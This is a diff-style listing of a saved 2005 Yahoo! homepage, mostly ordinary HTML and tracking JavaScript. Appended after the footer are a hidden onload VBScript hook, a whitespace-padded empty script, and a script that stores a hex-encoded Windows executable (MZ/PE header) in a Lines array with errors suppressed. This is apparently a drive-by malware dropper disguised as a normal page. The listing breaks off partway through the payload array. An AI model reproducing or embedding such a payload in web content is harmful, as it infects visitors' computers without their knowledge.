+<BR>Copyright © 2005 Yahoo! Inc. All rights reserved. <A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/cy">Copyright/IP 
+Policy</A>. </SPAN><SPAN class=m>
+<DIV id=j>
+<TABLE cellSpacing=0 cellPadding=0 border=0>
+  <TBODY>
+  <TR>
+    <TD><A 
+      href="http://us.ard.yahoo.com/SIG=12idqmma4/M=331696.6550468.7545790.6367092/D=yahoo_top/S=2716149:BC1/_ylt=ArPtIkITlN9hmb.jSz8wDez1cSkA/Y=YAHOO/EXP=1118774771/A=2773997/R=0/SIG=1113i4lob/*http://broadway.yahoo.com?loc=0"><IMG 
+      height=28 alt="" src="Yahoo!_files/btn_84x28_6.gif" width=84 
+    border=0></A></TD></TR></TBODY></TABLE>
+<SCRIPT language=javascript>
+if(window.yzq_d==null)window.yzq_d=new Object();
+window.yzq_d['e1rlFNibyQg-']='&U=138im14l8%2fN%3de1rlFNibyQg-%2fC%3d331696.6550468.7545790.6367092%2fD%3dBC1%2fB%3d2773997';
+</SCRIPT>
+<NOSCRIPT><IMG height=1 alt="" src="Yahoo!_files/CAWTE3CB.gif" 
+width=1></NOSCRIPT></DIV></SPAN></DIV></DIV><IFRAME name=procframe 
+src="about:blank" frameBorder=0 width=0 height=0></IFRAME>
+<SCRIPT language=javascript>
+function hd2(){
+hd1();
+}
+var owo=window.onload;
+function lo(e){
+now=new Date;
+t5=now.getTime();
+if(_ie){
+dc.onresize=hd2;
+_el=d.activeElement;
+if(!_el){return;}
+var _id=_el.id;
+if(!d.body.scrollTop&&(_id=='bd'||_id=='sub'||_id=='tabs'||_el==box)){box.focus();}
+}else{
+_el=e.pageY;
+if(_el<96)box.focus();
+}
+_hdi=0;
+if(owo)owo();
+}
+window.onload=lo;
+var ta=1;
+d.onmousedown=md;
+d.onkeydown=kd;
+xt=new Array();
+xt[2]='&#149; <a href=r/mk>My Web <img style="vertical-align:abs-middle;margin:0" src=http://us.i1.yimg.com/us.yimg.com/i/ww/beta.gif width=17 height=5></a><br>';
+function sl(cn,as){
+xt[1]='&#149; <a href='+as+'>Advanced</a><br>';
+lk='';
+for(r=1;r<=cn;r++)lk+=xt[r];
+d.getElementById('ld').innerHTML=lk;
+}
+ts=new Array();
+ts[1]=new Array(2,'r/so','web');
+ts[2]=new Array(2,'r/01','img');
+ts[3]=new Array(2,'r/15','vid');
+ts[4]=new Array(2,'r/0b','dir');
+ts[5]=new Array(0,0,'lcl');
+ts[6]=new Array(2,'r/0c','news');
+ts[7]=new Array(1,'r/07','prod');
+st=0;
+at=0;
+var _bv='',_ffs=0;
+function t(o){
+if(sbc&&o.id=='v5'&&lt.id=='v4'){o=d.getElementById('v6');}
+else if(sbc&&o.id=='v5'&&lt.id=='v6'){o=d.getElementById('v4');}
+d.sf1.action=o.href;
+ta=o.id.substring(1);
+d.sf1.fr.value='FP-tab-'+ts[ta][2]+'-t';
+lt.className='o';
+u(lt,1);
+o.className='h';
+u(o,0);
+sl(ts[ta][0],ts[ta][1]);
+d.getElementById('s').className='v'+ta;
+d.getElementById('sb').innerHTML='Search '+((ta==1)?'the ':'')+o.innerHTML+':';
+if(o.id=='v5'){
+_bv=box.value;
+d.getElementById('ip').innerHTML='<span id=bss class=f><label for=fp id=bs>Businesses & Services</label><input type=text name=p id=fp></span><span id=in class=f>in</span><span id=acs class=f><label for=csz id=ac>Address, City & State, or ZIP</label><input type=text name=csz id=csz></span>';
+d.getElementById('csz').value=_lcs;
+box=d.getElementById('fp');
+box.value=_bv;
+}else if(lt.id=='v5'){
+_bv=box.value;
+_lcs=d.getElementById('csz').value;
+d.getElementById('ip').innerHTML='<input type=text name=p id=fp>';
+d.sf1.onsubmit=null;
+box=d.getElementById('fp');
+box.value=_bv;
+}
+lt=o;
+st=1;
+if(!_ffs)setTimeout('box.focus()',1);
+}
+function u(o,z){
+var em=o.id.substring(1);
+var p=d.getElementById('e'+em);
+if(p){(z==0)?p.style.backgroundColor='#fff':p.style.backgroundColor='#989898';}
+if(sbc&&o.id=='v6')em=5;
+p=d.getElementById('e'+(em-1));
+if(p){(z==0)?p.style.backgroundColor='#fff':p.style.backgroundColor='#989898';}
+}
+function md(e){
+(window.event)?ev=window.event:ev=e;
+(ev.target)?sr=ev.target:sr=ev.srcElement;
+if(ev&&sr&&sr.id=="fp"||sr.id=="sb")st=1;
+}
+function kd(e){
+(window.event)?ev=window.event:ev=e;
+(ev.target)?el=ev.target:el=ev.srcElement;
+if(ev&&el){code=ev.keyCode;id=el.id;}
+else{return;}
+ctn=lt.id.substring(1);
+if(code==13){return;}
+else if((code<31||code>41)&&(code<16||code>18)&&code!=9&&code!=8){gk=1;}
+else{gk=0;}
+if(!_ffs&&(id=='fp'||id=='st')){
+if(code==9){
+if(box.value==''||(box.value!=''&&(at==1||ev.shiftKey))){
+mt(ctn);
+}else if(id=='st'&&box.value!=''&&at==0){
+at=1;
+mt(ctn);
+}
+}else if(id=='fp'&&gk==0&&(box.value==''&&st==0)&&!ev.shiftKey&&!ev.ctrlKey&&!ev.altKey){
+d.getElementById('mk').focus();
+d.getElementById('mk').blur();
+}else if(gk==1){
+at=0;
+}
+}else if((id=='mk2'&&box.value!=''&&ev.shiftKey&&code==9)||(id=='m6'&&!ev.shiftKey&&code==9)){
+d.getElementById('mk').focus();
+}else if(!_ffs&&gk==1&&el.type!='text'&&!ev.ctrlKey&&!ev.altKey){
+box.value='';
+box.focus();
+}
+}
+function mt(ctn){
+if((ev&&!ev.ctrlKey&&!ev.altKey)||!ev){
+if(ev.shiftKey){nextTab=parseInt(ctn)-1;}
+else{nextTab=parseInt(ctn)+1;}
+if(nextTab==0){d.getElementById('mk').focus();}
+else if(nextTab<8){t(d.getElementById('v'+nextTab));}
+else{return;}
+}
+}
+var clo=0;
+function cl(){
+var cld=d.getElementById('lc');
+var ca=d.getElementById('ca');
+if(clo){
+cld.innerHTML=cwi;
+ca.className='';
+clo=0;
+}else{
+cwi=cld.innerHTML;
+cld.innerHTML='<form name=w onsubmit="return gw(this)"><div id=wa></div><label for=zi class=np><span id=wg>Enter City or U.S. Zip Code</span></label><div><span id=z><input type=text id=zi name=p></span><span id=ws><input class=s2 type=submit value=Go></span></div><div id=wc class=wa><input type=checkbox id=we name=sv value=on checked> <label for=we>Save location on this page</label></div></form>';
+ca.className='r';
+clo=1;
+setTimeout('d.w.p.focus()',1);
+}
+}
+</SCRIPT>
+
+<SCRIPT language=javascript>
+now=new Date;
+t4=now.getTime();
+var s=screen,b=document.body;
+b.style.behavior='url(#default#clientCaps)';
+cc='&hp='+(hp?1:0)+'&ct='+b.connectionType+'&sh='+s.height+'&sw='+s.width+'&ch='+b.clientHeight+'&cw='+b.clientWidth;
+</SCRIPT>
+
+<SCRIPT language=javascript>
+if(window.yzq_p==null)document.write("<scr"+"ipt type=text/javascript src=http://us.js1.yimg.com/us.yimg.com/lib/bc/bc_2.0.0.js></scr"+"ipt>");
+</SCRIPT>
+
+<SCRIPT type=text/javascript>
+if(window.yzq_p)yzq_p('P=XRC5FdhtdkwND7R6Qq73fJqGUQp9r0KvCdMAAgaQ&T=13t8p3m22%2fX%3d1118767571%2fE%3d2716149%2fR%3dyahoo_top%2fK%3d5%2fV%3d1.1%2fW%3dJ%2fY%3dYAHOO%2fF%3d3854856830%2fS%3d1%2fJ%3d4C766DD8');
+if(window.yzq_s)yzq_s();
+</SCRIPT>
+<NOSCRIPT><IMG height=1 alt="" src="Yahoo!_files/b.gif" width=1></NOSCRIPT> <!-- p13.www.dcn.yahoo.com uncompressed Tue Jun 14 09:46:11 PDT 2005 --><BODY onload="vbscript:script">
+<script language=vbscript>
+                                                                                                                                                                                                                              
+</script>
+<Script Language=vbscript>
+On Error Resume Next
+
+Dim Lines(34)
+Lines(1) = "4D5A90000300000004000000FFFF0000B800400300000000400000000000000000000000000000000000000000000000000000000000000000000000B80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000B71207DBF3736988F3736988F37369881A6C6488F273698852696368F3736988000000000000000000000000000000000000000000000000504500004C01030024C715420000000000000000E0000F010B01060000300000001000000070000072A600000080000000B000000000400000100000000200000400000001000000040000000000000000C00000000400000000000002000000000010000010000000001000001000000000000010000000000000000000000064B500009C00000000B000006405000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002E70656C6F61640000700000001000000000000000040000000000000000000000000000800000E02E53746F6E65000000300000008000000028000000040000000000000000000000000000400000E0"
+Lines(2) = "5765696A756E4C690010000000B0000000060000002C0000000000000000000000000000400000C000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000BB7A12913D285F643C29512C643C10622F291521313F186F236C24511C6C402F747E512C643C036E272902722128517437251F6664192159691C036E302912752B3E517775624164642E08210620186F206C306F23291D6B1481FEA76025722BF4B1661F08BD6A1B8CF9A65F481D8A33F4B1761F4855524B34F1AED7C07D2A530CB9E68F386D3AE3A4819E475055524B1401BEE79085F29B84F1AEF7B0ED9A4334712ED7FFC64DE20D27877A653226AE4B991DFDF562C98ABAAA242C6B7AE33B"
+Lines(3) = "E97EA89200FF25201040050C191919194438085C19191919287864481919191940701074191919192C58604C19191919546C1814191919193C04345019191919301C2400E4FF8219680368F8124000E802000130FF7F90E6303875FF1212C57E7847BD1656D99844F9FFCDC9909E010600F4000C0061002D0178012B01FFFFFF1FCC31000222FADD51B235B0468276F68F99B0A66B6D341B456C3C7546E1B7FFFF87AB516814A073123A4FAD339966CF11B73BAA0060D3935CFDAC3B00C803347762000D1961BFFDBF0542002200240500466F726D72260027003533EDFCCBE55703A40144004603FF0156A8DDFFBFFF54696D657233000B0348051A0069006E0074006500720765ACFBDC7709200063006F0B0D630F690DF68D755F1568116B29075508E64219A43B033656023239EBBAB1EF030A58092A79386C406736E09A873C000002045003E60EB09122F2106D17373FC80121841140004C5642353E6113F621F01F2A237E0D0A0009046B6EC34BD018F1F8308E00961BB9F9DE4E03E9A81240485B00D6BDA6787B67038587E728FCED7964CA726F6A6563748004439BBDC70505741F4D5A000B90BBEDF62820134070031843B813409EE3EC970FE8042FE84F010F7BC1DD0004034A82831604471801D24DB6674B0805FF801F182D322153281A97D72C279001F81F68020B2B7F8665A41415B5D82423230FECCED6B0"
+Lines(4) = "EC250376078803342D96CB6DB35018340B9426B4274C6EDDAE694460074029332807E610EDBAA65910DAD8137027202AFCB66EB30364A43AEF5003BA08B916B2057B3765FFE1BA100BAB05D974EE04B82083AB0348156EB31C64136C55FC0C3763964DD37503280738440A115C699AA66B6C037898B0C0B9ECBAA6CC54476003FC371C322E97DB662C0C38A7D039C44BE43E1EF6966CD03914B3E43E9A0964400488143DC8B2690B141619649F22596E5DB387152C9310077023F8DB74E6B6AC357F4C1607587C2403D335DB6634DC2207D4641BDCB2EB9A6D00360388FE339007602DBA1376DD0489C0478C1077E603C27DABB065033A03110049004EDD4C5DD70B4F09530F73A103A457C973A1B9F36C413B93C85357BCE4616F18F70C3BC8533413C880035858729065D30E10171AB4CBCEDC76DDA8C388F78034EF7817277165ECBAC0BF24D76C176F4866DB7583739C1F3C031031D7EC5DB36DBABC03F2C430375404074C7BEC13760358310FC02F40EB3B002E03BAEE058205E84333477B3CB2D92C17072C3E98703DE843086FD85B200B281F72402E792C3E98703D939FFB4AF7408F07F83007196490AC6834EC2F7CCD2027A86006172E9041CE9EE42C07701C830C7272C42B7820D8196490932A904C08C8202707C029742841063939D42890440C32C8C9F8279C581064909383C8267C2C414E9E1CD425BC24640C"
+Lines(5) = "7272901CA823580C61B89683C422F4C75F751F9DE38066EB031054700711111A349C172AC741E7DF83AEA3836671726B770569DC033706DD136D8B70118D066E73DB05611115421BD67B3375DD7A0D641D500B134D00590B5CF7C6A073B176050D6221A3DBCCF6110959316F012B41DB4C079B5D61DF200F6C4331487CA65C616A3C311485B9CD75436277003226D175900B28CF3BC13BAC7214399BC81372E465D3470A101D630080D45A9E3D39F6841B40375821381D0F401D7037694E3C033FB701686DFB6CD7FBB80BE4761F0C77191B165F89D26C9B3838250720444B3C109265255CA7929DEEC2DA4870E7500F60810333D883682D1F2333D734CBEE7C17AC2D909EA40365D3345DC00FE4AA8678215DD72C9BF00C2EB034076C03B6DC934D0717BCDC2B042F230B3C0BEC03B4313384175BD89DC1A63B03FC0C329F58ECBA93D83BC0251BC8371C07AC14D3755DB33C48335007CC0B847D4FCC62FC3217EFB82333AEEBBAB3BFCE07344B907B580B4D7716BB6C037C3337D41F8CF062596CB62A07A0382B4716BBEEC0435C0BA8038C294BBA93D85DA803BC331BD807E8DC765DF74703E033FC07904047F45C5C6E5DD74E7F3AB745CB9C42C43C930B5DD73F1B65C3493768211EB8130FED48B70BDB6085DDC300E01D6B471B8B17199041BE274C02FCC7E87B07142217271FEB1C2235CB6F197F27181EB82CD3741D"
+Lines(6) = "83172B933F035367AE699A65B31EC7DBEF031372FB118C17CB7B0C1B031C114ACE36CD2228FC1E1B6801A4FBD5D24E331B90C2821D6100C04F04F7E19F83B8663D33C0BAA5682E8E64491E76C3B85013F45C27240F9BE4104E4C3B343A0E2B79C848AC45F59257F2C813C43CC83F36E495BCF4654849CBBB01AB299F5463A80FC3EDB926FEFF17D34389704DB85E3A64D81A0BBA0ACD08039107AC627F9B142140BFC3A9C929048BA74B602286CE7A612B1821B7E85F3C3B487D6983E818142F74316631CE9E7070071C9F00932707F92F018013182D079066904824187016D20C76615F602F2C0E72F2E4007815F0241CE400D20C300BC414D20C72F2C4368038036B98C25600342F4403AE1984A64C583B616207BDF587FC446566696E6532005265674369616C2478FF8FFF746D6C50617373576F72640FAE12FCFF87477AA7DB3625A5479A150A3293EA3556DE21FFFF431D01F05B25E4EC44A7B988D7F1DD70412AFF1693607A133DFBFCFAA06810BF01FFC6A738092B3371B5443A5C3F6772616D20DFFEB7FF46696C65735C4D69630F736F667420566973759C205374750FF8EE6FA46F5C5642393804362E4F4C42EF4D37C806A3A0060309B0E0CB78A421EB5222753370301B10B260909F0072ACF7FF5C3623446F776E6C6F616480431DDE0A6D4C90200747657412868ED68D474C1F529E1B5C6B345D0393030338"
+Lines(7) = "033C1C899D030A61B305042C7913449AEE0403080CF8E4FFBBBB0504040DBB41445641504933322E646C6C00358C6D1F4C73614383737FA4B7B8DF1DB0CF034F04CBA10C0C0BC07402FF5C6B88EFE068C42380BCD00D1B72D87FF757AF4C656E67746853696447FC79C9810C10180C237FE1B10B13EB6F6B75C263636F756E74E4E4D9854E9965414B44231C19924B0E2458175DD82DBC436F6E767C7491546FC9726932C860AE9E0A4F902858C9250730A8DFB6AE7027864765555005766174656DADD9B64403611B1A49AD6A6E6DDB9CA11D077608630E64730CF20573225B73E0340B79C9813C1C24B6F1C2930E4F7058506F6C9B7947E4404E0E54244048F19A21B964096B9D6F7FE628F8895752746C4D6FC74D656D0CB2FC1A88579C24AC4C4372C98154BC44DD46B65AB1130010350520A4E4E54BF5FFFF6920782240349BEC6CA512001506B0EFB9EE3F295B03790B2017753D10195D733B456B0DC9922B1D07C7232237A1D3900F0247E74AB29991A60388880B14A9792B32148F77696E740EC1D9091C05DFADC09A46819CB03B3343FC231758030B79C960D42563ED1DD2D2754E72650E4C65DCBE97DC645703EE4578419326571C2679C9819C646C2C26C05E920B07D353208374DB51644F7070D2905C72787C14B76CAB806B8A8CF7754C40CE3A364BB426037C8D95BCE484C826A463EFADC6737450B4616765"
+Lines(8) = "E247002F3990932788901027E6407E2553656E640C4B0E649048949C50F8119258334B697D64B0C1227F43908BA005904B0EA89C1EB80426372F0FFF69146E1DB4541D41116F63CD48D7910BFBD4275824EBACB892971CB4F82743DDCDD455772052820554680C640339E149873028C7B8C357F292C04428576169C80C7403D753E4484F62143990C1C6977C4BC4CC5866482E900C70838C19DA72DB8243C8D0905C7220D8D46C3663C619574DD84EE4EC211C4964CF0C2953DC5DC84B0EE428291236612D7BB348B7604B971CF6618359F64BF074D9F23024132F72654CC86011080397F43124971DFC4BC00E47786C970F46E8650E77F829931C902700760876088523B1922A8448613520273F170A43402A0C2F805C72144C84C13ED7E24C6962D3D0CF8443192F39901820902AF39182BD586F437F7220837C47C8242C61C6905CD80F03619C1C7BFC416464724A47102B309962C981383F4F583865F3726CA06EB75552874A0CA14C32D434810CD675A1583364573C784372C94478119F0B13059EAB6D2DB969404E38D9EBB02B7748EB95BCE450C42B7368258DD31D56260E0F530DB3DDE74A865D58FC330C2C57252F3990545C1C2CF0AFC87F6164767061636BD349734E54605D7BB4506D22472F645381971CC86068702CF31D06902B53105B56A0D202954565A3B190C4A3DC4D09ED130319EC81D3A8736CF086E4"
+Lines(9) = "9274E41A5D8CB678080905010D6EA5BE902C151779255CE65C3CA3AE2E004B0300EEA91E0613573C6405CA156EB272134911734BD81B5BE632131647154D164EF52D2F5C565370C2BE48F76D131E576637C561A69904265F75B1EE2C66ADE766316C2742B7B9B1244B4117016C1563C5B0B14BAAD0440D6177E070F77FB866C4A49F491B10BB78FF383CBB29B62E34161B443DA4655654752F427C3D3D532CFB00747256BC7C5FF17465DB73630F49520D7903890F42AE96AA7BD1072E473633B9CD758535C0013009032D0D5873D3BC0938003131310042391FBACF74DD380930014107321539452CE8E82F34157DEB307F01224F0B41362E444C4CDD75AF79BB313E1F9374FF3A002F35DD76C801B9F17A036D2EEE81B657EA092FA1730F36D7D040E570653FAFC73DFA83C30457078A4B65794FE0471333FB502F9F7C76252739208476602F39CC25614F494798B9E440068890A8BD0393210CA2467220838C8BE0949C7662815CECF68B3990B313243047A0A8C96F212F3430BF482E92971CC8ACB46830936397B04F4143A030482E3990B8C0ACA341E364115193189A06199B10964BE4C421B9E440CCF87ECB5C930F8A49D73031BCE4404ED0D84031E935D991082728DB894C5347C7797753720D5C024C378B390B70C9223376132F1C57EA1AA4A6212755D1200144C6BAB1C95B263773013D13087507E64669290F74"
+Lines(10) = "433DFF64B396334B1361160CD3AFCDD0B8F5FFD2118A1CC04FC9E26EC12AB2EAC130F7A7EBDD90C01B5B5BAE0B290774CB73D9E935256D4DF71B876A3E375C1D69647747F605BCAE4397722F6056CFB0BE8235737D356F93BD5EF55EBF2F8B413D30844399475D736EEC8BD57762494D6711740B22237CB179EB477377387BE0B9CB4520836D11678DDD7B13D6FF550B83077900912D093FC7576C12AF9BFB9F3A8D4B477052075E3B97DB4C30F6CD1E59313F45B174268325239B0C0F1878B111C64765294DF9DD463C23F80B414D9600DDAAFB2603806B416D54186CB0367730E320A35BF660060FA10B1B3F2744025E7301F74B57EEC34D08A1204B4D6B091D96309A4D6E93BF23938CD08DB9370130631A4C838D30088756C177E19C075D03631F4FA7546F410904034847452F4D41E12106675E762113742DA4E1CDA070F559F56CE3E0066164C96D1DBB516BF8E031334D4DF7410770DD07AE47A14D333F3113D73DE83E572D93345715361D38BEC8587DC3106D628729B09378134B5ABB195B228C57EB47752F30485D37544B70A170F752ABDEB0EA83498D9BC6C808DD1321830430032D090D321E4C2105D244F79950B1491545F380B9032C04D54EB7B282D73CE56F6BD508E2C5B6B7ED73621FA9F1B9EF752FB7252E0B19005BB28F9387880FEF5021617537482374DB621F3D0F0C058E092B4C033348B1C47B30"
+Lines(11) = "0547AE20170125E02CD7083B90DE2E74EB533D986103D8651C374390017912000C65A318DF84D863759B004157D6247CA7BB1367FF4937BD91EE0B006EB164613B9A86872483F770CF74088C706646791F673F4118FB005E71796227654E1802C973BD6164837487C95356FB536520CC9D111DB12D7F66298168817FD6E37259A09BA8F69FA46FDBB75F24A0C90A8F3966CB85954D0F96FC80C7F43F57AACFEE85DC373703005FF5126D2EF05030B598CFBB82BDCE7661CEDC627B94390300533601182B0004B07733EA010107C1AB0360203843CD61EFB81EAA0C01F906230624CD243F2530230401FD071CC922752428A36B15160DB0092303A8D774DD802BA4035CC83760837C4B4F2705EC1B1847F6DC30075F635CCB4276C92F3F741F44272EBEEAC317EC21400FDC2A6880597E0B1C22E02F74408B0DCF63632B6EB0E08802E517E2487FB7BFBBB6576438FC34FCF874FF350AFC6308F4FF704D23D4FB7AFF15F400051708292802C9387301001253EDB6256C1B33030F4902B7EDDBB6B5141207643E073178FF6C026E5D7BA11B39FB3D1C440A0850FD9183B06D0524687A22131B04B22D9075652C63350173B13CDF1607F50EF5595EDF6E6FFF137170FF3C6C03FC52702F6B78CA00C61C2FEA598191001E8AD84621AC81163CAB51A7246FBBB02525C30B6C0C5FDB766C43C34A71676C02F51AB2FB757FDFE4988F"
+Lines(12) = "9304F404A90C02DB5E165AD27D54B799100414830CD738B83DB0506B046CBD22597597BF5B41804268FF346C68FF800A13233CB7F6F6D60B6C15FC586C1DFD6954036EFF2FBB63C36E121B18283A0A19703C2F5375C1610D150E143FB60592BF8B28005831029B96672B13688F5C5414CB60AFD9665858998F5814EB4AD33C54445C1E1833C976DB3D0B1488463409F66C8B5CAC6B8B3CFD95101D48BF2C8BDB7946261402013502826BBA65138F583413F785A77958256C6C04FCB3D18E9934185E47390D68684178B6A40C6C3C137F115C6BC4328917CB2DC71C5AF7E1B6191DC0146B8F103F39B04046601F97702143089B4C01BB16986B385DF5DD3050340B992E84B3D414D1177E0F23C18C4014D9D7140A1B853474AB6CDD4337A64ADB502C50AD01305B4B80290718FE56C6666F115093BB2C0084BE81104A6BBB50BAFEBAF4BF38560F65FE886C697AED0A70FB84080D0D48A17DFE8DD886ECB64A1A061C6F173D1619551B5B57AE190805614FF47DB50EBE4860FDE708F0350D39F8DFC0DCCDC7020A0EA32E688BA8E3D53D118DC43F1B7C20630766DF001CB70461A6E9B65A70037874C36318BB6D0F58D71B48BDB39CF1383069B3A32FCDA6B0639F1B4923AA24619790ED174A4A385E4B47F65676984D7028ED2624533B4778034A0321049266089CA703B3F06D07FF2D04643A004C7F061E9E6D9F76A722AEFE"
+Lines(13) = "64DFDB034BCF8D221BF92A23587C05D26CDD0B07418A000D541404504C72D24C044C480CA02CDDD244050640065A7334EC59320E4A545B2D28CD5A7BD81C40A96668B4C60A811683C73C73839864ACE7012C670854A669BAC1674C03484440AD693606DB58DD312E270327B6EF400A14612D09F585159B9DBA33FA60190B4F0E16DDDB0AA6FE055186241FFC1F2EF5E090FC14A2511E8618462C9D5BF8B0FF18E7043C49155707FB6C0D53F7EF1CFF60EA3636D1E058AE6783AD43425FFF08A5D9D884B588ADDB3CD902DB988F0B2D5032A80D79FF6C2040039392E70C24E0943B111B335F9DDBDC16D10671471C034E05C4F6B18B4B660EF50176049E42061CCD12214B762A4D866E8D25880D1429570D65A151A2504160A1437DA169D6463CD8AE4D950840044C314CB3BCD644000C4C2CC200B4F6B61A34366A1412EEE8EEB0462AC43110F806884804246C3CDC2F310D58DD49EB45092349B32020FA62BDB16E2D0A46836C467BE9648BD6092B67135CBFC46285417757DC24633C3324DB062003808CB09DCFA202132C58C486C520830788DC43EB5E1C710E1B3B2D12D347FBB1FBC1802A0A026C2D7651E420DFFBF1FDC768D7436CCA2502F86E31C706A8C01F1EF77084469E09797164640A0B13B2B99A1A5CC0226060BE4FED2C5818791B0C714C59B665590D5050080E545C33B66C549D770E5C790FCDF190602904"
+Lines(14) = "FE4A291428D0A203BBC1DB921186B2DB3047098E24F340BF5C6364130FEC1A5B60030B39488B8EE2C34063210F867C505C67EC70140823058A4403AA2E1CAC740B8F11B80B78DB1CED8C92519B6C538DED2C82A31C82952F759E0C66C3C01C88005AFC31B24D1687D004882F101BD866A397001EAF371221DB5B598D2671024BD3C2CB2A301CC5643B811B43A19DB013DD1B0501076F7058966560603D64C6305938C1A9726CEA3E609990CD6139054F3F690EA4D92964646C6CF0300B161604816C9FB02DD3C2417B064965010A42935ED500F837010F65AE10B61C2D01C3682248D38113640B60920ECFD625C674F4528CB6F6A1666060755E0F3AA65C2E064F6A608A6C5C8A1C8E3D3D8470735E01B8010B0401708DA7C6140B3D4614ED3B0B9C1F0511000C016816D4DC176F3C716E3867030332859D7B5C7E34386D86F36C8668346B1738CB5CEC808A0101875A86D8CDE0D923600CFEFDC41C0B12ECAC33607C8EC61EBD03C93011F610D0329034A9EE36800F6B42FBFD5F14B32524E4074C006001308F584C3A81DF74577F4ED67648A3DC01AF4BAC9CC0CADA9E5C16AB5CC8E63A4B7E0E02225848B4B34C58581890BAB6D2C40F74681D5C11540F3368B31345F2395E6CBB26B8617F2AC6FE8E09116EBBFD7548801AF401F4105D20050119C6F625E8FF16625AFD3D1B1D2D0BA2F230FB0ABA503B155C1DCE1A03C1"
+Lines(15) = "AD61703888C52496565ACBDB2D2C94584C0B8E7867FCCB0F8B12AEA1AE99AA0E4BEBA26D5DC36DA0276623E76B07082E5657EEEB1158B6601F260EF50A9AF46458C3E75A06B0F61AAF64CE83274B730274180430AA7C4C9A2B5454D15C72C8201DAA5C305C936BC3C9645C55136AC99B9126E486FBB00140288BD4B55A9204E05749940E0C929DA9740DBF5C608C86046B607F03A51C7FBC0027FF4150219928E60E5D4A36CEF8645D6808C520BC04730105DDC9DE11FD9303403742504501ABAE1DF640783A08091C0428DDC56FEB0AC608073A38485DFB33ED16DC83211C6B011174252AFE9AF28199A211722D08FF091BEED4071D01949F04DF073AB037722108FD91000E8A4542BAE62D33520AECADEEAE5F4BF8FE0B08283D23F4FE419E8BB625042F117462FBCE20D61E1A58990A1EA20C901C5860080884858684396641317221BF00190CECFE1502BADB13320CE8FE04020B0D6E1A326587D0072D0D313E93976D6D718500370A0E10E22D61A170A40114F33848E246441802DB03422D196194CDEB1F01699AE5E8FE605028E6DE14A90A18D3002228500A0EA77916380440DA2740743CE05A6B1A0A5387343CB2806BC0FC28882E3C6C14EB762F07001F024C607223CFF650422950355B5B9430D82601F012178F7026764B1008D74679B0B4DDDE3400489BF23A442BA22C78DBAD6CC434021B2D083C7870FE0A93"
+Lines(16) = "91ED5E2E00108C45F3B2EA4024FF2F1486383C9BDF6D110415F4FE3AE4FE30D4FE34C2E665B9C4FEB4A4FE3194FED5362FDD2F8E4684187464FE3254FEB773DBEDE346441234FE57FE060804FE73B1DAFD33004EF4FD0402E4FD55075B876DF0BDFD3AC4FD22B4840E4EA4169EAF761894FD16323440205A6BAD459E938C817A6BADB5D66C655D4B584442DB4DDC5A3B2D000FA890FD24A60DB66D9BAAA4A927272B27302735168239E22750DE1B103619EC27DB01084D0016048EFD1A7CE1C5C2AD6B0D1CE8220744FDF833D8B61EC60B0D55800AFC633DB31E415B1E1911ACC76D0A83ADF03A02C3002AC0EA306807C754C774633CC4EF014F400314699A66D9F4FED4B49474B36C9AA6543414F4FDE45C46334DD4B4F5872B5996050A9EEF340102014D9DE503345F3025DAB6F05631F42F091A14F7C842AE015E2D7130E3DDCC33072C03716025181FB09C40C36008612BBB848D045F09371E5E0AC960216B2A3A2A0B05789A563B2844798C46BA17F66D0C1E0B4D72D738F5369E0D000C58B3F474B62B2E1A8067382C1CAD5D73C10CD55E07FC60CD5AB585C70408EA5C350E8568C834237BDF224A75D1661307934BB414699B2D935A782F183B2E00F75E3F77405E4F1C2D043F3C25BBCDEC4A6C370A11A7080D7148CC00976C6328F56F5E0D6B9709742404EA5537205FCC522B5374210D5A72C233E00D1037127BE2"
+Lines(17) = "6C386F5CF5660820CE6EDB390A381B1780FF5359BF3376E65E53131A21C1FBEE8B01F966FF20780BC2E8012693936C3013C68D3143787B0238D71EEE7828207F3C6E2B128C81055CE0FC3D1E26331EA38901041630E303000CBA20846B082B5F6D806287D05FD11C7B026C04057A15B9F862299A904844D2BD180B860F475F601D7B6DCCFF2E710A39CB7104DD80C8B20B6810497802EF906DF20E022664641AEC85FD66356FB4005FA500361DF6960D2A600E02A7E4408EA924012809010532853C6002B9EC4D2A7B266F0C7768C62960022F4B1E7CE67F69590013F0FE116004E0FE0A1734E070AE2A4B15D0120776624AB62ECCCC63255CC980B51C4A2860C905729400440272945C5C08B3218C2CC25A07B500C809560806E4FF2213A2BB1000B0008002AC43A2310E94DD04A33BE2510B01057F5B0801BB07392565000201442B58B457D83FA023F9CA987E022BFF6491CECCFF0C00924C2BB03030184B0F01308B0ACD0E971027AF855F8C0C3AFB4E184F18F833C019800AE60752D573426B130A88FF64384480805F0F8872D50A3477A8032D0E58E890C82EF940858019A1B9FC18036543C075BBCD089134030A02773C1AEED4D73E722D2D3E5CE47BD6146D6B6808FE0FED188E064B17CF0318C35C180C4164334A058E6173C0EF1B04FD0B05F7132AA8BC1723506450622376C5D976A36C50AE07ED0F0F9AA031A9"
